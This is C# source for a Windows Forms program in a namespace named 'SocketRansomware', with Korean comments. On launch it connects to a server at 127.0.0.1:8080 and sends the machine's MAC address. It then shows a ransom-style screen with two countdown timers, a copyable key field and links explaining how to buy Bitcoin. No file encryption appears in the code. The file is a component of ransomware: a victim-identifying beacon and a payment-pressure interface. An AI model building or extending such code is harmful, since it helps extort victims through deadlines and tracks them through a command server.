using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;


namespace SocketRansomware
{
    public partial class Form1 : Form
    {
        TcpClient client;
        public Form1()
        {
            InitializeComponent();

        }

        private int duration = 36000;
        private int duration2 = 43200;
        DateTime dt;
        
        private void ConnectServer()
        {
            try
            {
                client = new TcpClient(); //연결
                client.Connect("127.0.0.1", 8080); //설정
                SendDataServer();
             
            }
            catch (SocketException)
            {
                MessageBox.Show("실패");
            }
            catch (Exception)
            {
                MessageBox.Show("실패");
            }
        }
       //서버로 컴퓨터 정보 전송
        private void SendDataServer()
        {
            byte[] buffer = new byte[1024];
            string str = string.Empty;
            //mac address
            str = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();

            try
            {
                for (int i = 0; i < 1024; i++) buffer[i] = 0; //서버설명과 같음.
                buffer = Encoding.Default.GetBytes(str);
                NetworkStream net = client.GetStream(); //서버설명과 같음.
                net.Write(buffer, 0, buffer.Length); //버퍼에 데이터를 씀 c++로따지면 send함수
                net.Flush(); //버퍼비우기
            }
            catch (SocketException se)
            {
                MessageBox.Show("실패");
            }
            catch (Exception ee)
            {
                MessageBox.Show("실패");
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ConnectServer();
            cbboxLanguage.SelectedIndex = 0;

            dt = new DateTime();
            timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(count_down);
            timer1.Interval = 1000;
            timer1.Start();

          /*  timer2 = new System.Windows.Forms.Timer();
            timer2.Tick += new EventHandler(count_down);
            timer2.Interval = 1000;
            timer2.Start();*/

            
            lbDate1.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            lbDate2.Text = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        }

        private void lbAboutBit_Click(object sender, EventArgs e)
        {

        }

      

        private void count_down(object sender, EventArgs e)
        {
            
            if(duration == 0)
            {
                timer1.Stop();
            }
            else if(duration > 0)
            {
                duration--;
                lbtimer1.Text = dt.AddSeconds(duration).ToString("HH:mm:ss");
            }

            if (duration2 == 0)
            {  
                timer1.Stop();
              
            }
            else if (duration2 > 0)
            {
                duration2--;
                lbtimer2.Text = dt.AddSeconds(duration2).ToString("HH:mm:ss");
            }
        }

        private void btnCopy_Click(object sender, EventArgs e)
        {
            tbKey.SelectAll();
            tbKey.Copy();
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                VisitLink();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Unable to open link that was clicked.");
            }
        }

        private void VisitLink()
        {
            linkLabel1.LinkVisited = true;
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                VisitLink2();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Unable to open link that was clicked.");
            }
        }

        private void VisitLink2()
        {
            linkLabel2.LinkVisited = true;
            System.Diagnostics.Process.Start("https://www.investopedia.com/articles/investing/082914/basics-buying-and-investing-bitcoin.asp");
        }
    }
   
}
